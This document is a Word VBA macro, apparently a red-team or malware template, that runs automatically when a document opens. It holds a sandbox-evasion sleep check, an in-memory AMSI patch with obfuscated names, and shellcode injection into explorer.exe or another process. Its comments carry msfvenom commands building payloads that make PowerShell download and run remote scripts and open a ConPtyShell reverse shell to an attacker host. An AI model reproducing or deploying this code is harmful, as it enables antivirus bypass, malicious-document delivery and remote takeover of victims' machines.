'av / 4msi
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
'std
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
'inject
Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
Public Declare PtrSafe Function EnumProcesses Lib "psapi.dll" (lpidProcess As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr) As LongPtr
Public Declare PtrSafe Function IsWow64Process Lib "KERNEL32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
Private Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean

Function mymacro()
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer
    Dim Is64 As Boolean
    Dim StrFile As String
    
    ' attempt av detection with sleep
    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If

    
    StrFile = Dir("c:\windows\system32\a?s?.d*")
    'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
    Is64 = arch()
    'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
    check = amcheck(StrFile, Is64)
    
    'If amsi is found, call amsi patching function
    If check Then
        patch StrFile, Is64
    End If
    '-f vbapplication | xclip -selection clipboard
    If Is64 Then
        'msfvenom --arch x64 --platform windows -p windows/x64/exec CMD="$(echo "powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/macro/x64.txt')")" EXITFUNC=thread -f vbapplication
        'msfvenom --arch x64 --platform windows -p windows/x64/exec CMD="$(echo powershell.exe -noprofile -noninteractive -windowstyle hidden -c "IEX(IWR http://$ME/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ME 8443")" EXITFUNC=thread
        
        buf = Array()
                                                                
        'grab handle to target, customizable
        pid = getPID("explorer.exe")
        Handle = OpenProcess(&H1F0FFF, False, pid)
    Else
        'msfvenom --arch x86 --platform windows -p windows/exec CMD="$(echo "powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/macro/x86.txt')")" EXITFUNC=thread -f vbapplication
        'msfvenom --arch x86 --platform windows -p windows/exec CMD="$(echo powershell.exe -noprofile -noninteractive -windowstyle hidden -c "IEX(IWR http://$ME/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ME 8443")" EXITFUNC=thread
        buf = Array()

        Handle = findWow64()
        ' 32-bit Word running on 64-bit OS, no suitable proc found
        If Handle = 0 Then
            'grab handle to target, which has to be running if this macro is opened from word
            pid = getPID("WINWORD.exe")
            Handle = OpenProcess(&H1F0FFF, False, pid)
        End If
    End If

    
    'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
    'byte-by-byte to attempt sneaking our shellcode past AV hooks
    For counter = LBound(buf) To UBound(buf)
        binData = buf(counter)
        Address = addr + counter
        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)
        Next counter
    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
End Function

Function arch() As Boolean
 'check architecture of current word process
    If Win64 Then
        arch = True
    Else
        arch = False
    End If
End Function

Function amcheck(StrFile As String, Is64 As Boolean) As Boolean
    'Checks for amsi.dll in word process. If found, returns True
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr
    Dim numMods As Integer
    Dim res As LongPtr
    amcheck = False
    
    'Assumes 1024 bytes will be enough to hold the module handles
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    If Is64 Then
        numMods = cbNeeded / 8
    Else
        numMods = cbNeeded / 4
    End If
    
    For i = 0 To numMods
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = StrFile Then
            amcheck = True
        End If
        Next i
End Function

Function findWow64() As Long
    'Enumerates processes on the target and attempts to find one running under WOW64 (i.e. its a 32-bit process)
    'Returns a HANDLE to a 32-bit proc, or 0 if nothing found
    'Assumes only called in 32-bit context
    Dim hProcs(0 To 1023) As LongPtr
    Dim res As LongPtr
    Dim numProcs As Integer
    Dim isWow64 As Boolean
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr

    isWow64 = False
    findWow64 = 0

    res = EnumProcesses(hProcs(0), 1024, cbNeeded)
    If res <> 0 Then
        numProcs = cbNeeded / 4
        For i = 0 To numProcs
            If hProcs(i) <> 0 Then
                hProcess = OpenProcess(&H1F0FFF, False, hProcs(i))
                If hProcess <> 0 Then
                    res = IsWow64Process(hProcess, isWow64)
                    If isWow64 Then
                        findWow64 = hProcess
                        res = EnumProcessModulesEx(findWow64, hMod(0), 1024, cbNeeded, &H3)
                        szProcessName = String$(50, 0)
                        GetModuleBaseName findWow64, hMod(0), szProcessName, Len(szProcessName)
                        ' Exit immediately if we've found a 32-bit proc other than the Word process
                        If Left(szProcessName, 11) <> "WINWORD.exe" Then
                            Exit Function
                        End If
                    Else
                        res = CloseHandle(hProcess)
                    End If
                    isWow64 = False
                End If
            End If
        Next i
    End If
End Function

Sub patch(StrFile As String, Is64 As Boolean)
    ' Patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.
    ' The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them.
    ' Depending on architecture these offsets vary, so a case is included for x86 and x64
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    Dim old As LongPtr
    Dim off As Integer

    lib = getmod(StrFile)
    If Is64 Then
        off = 96
    Else
        off = 80
    End If
    
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)

    If Is64 Then
        off = 352
    Else
        off = 256
    End If

    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Sub

Function getPID(injProc As String) As LongPtr
    Dim objServices As Object, objProcessSet As Object, Process As Object

    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = """ & injProc & """", , 48)
    For Each Process In objProcessSet
        getPID = Process.ProcessID
    Next
End Function

Sub test()
    mymacro
End Sub
Sub queen()
    'queen is the keyboard mapped macro to run the main test function.
    Application.Run MacroName:="test"
End Sub

Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub
